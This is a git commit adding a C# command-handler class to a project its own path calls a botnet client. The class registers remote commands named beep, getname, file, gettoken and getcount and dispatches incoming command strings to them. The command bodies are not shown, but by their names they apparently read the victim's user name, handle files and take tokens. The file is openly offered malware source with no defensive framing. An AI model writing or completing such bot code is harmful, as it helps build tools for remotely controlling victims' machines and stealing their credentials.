eb03f0e6145a06b708e79e989611b35c88cde4a4
O_Riley <86636387+Randumbdude@users.noreply.github.com>
2023-06-09 18:46:19 -0500

    Add files via upload

---
+++ Botnet/Client/Commands/CommandHandler.cs
@@ -0,0 +1,38 @@
+﻿using System.Collections.Generic;
+using System.Linq;
+
+namespace Client.Commands
+{
+    class CommandHandler
+    {
+        List<Command> commands;
+
+        public CommandHandler()
+        {
+            this.commands = new List<Command>();
+
+            this.commands.Add(new Beep("beep"));
+            this.commands.Add(new GetUserName("getname"));
+            this.commands.Add(new File("file"));
+            this.commands.Add(new getToken("gettoken"));
+            this.commands.Add(new getCount("getcount"));
+        }
+
+        public string runCommand(string cmd)
+        {
+            string[] sp = cmd.Split(' ');
+            string name = sp.First();
+            string[] args = sp.Skip(1).ToArray();
+
+            foreach (Command c in this.commands)
+            {
+                if (c.name.ToLower() == name)
+                {
+                    return c.execute(args);
+                }
+            }
+
+            return $"Command \"{cmd}\" does not exist";
+        }
+    }
+}
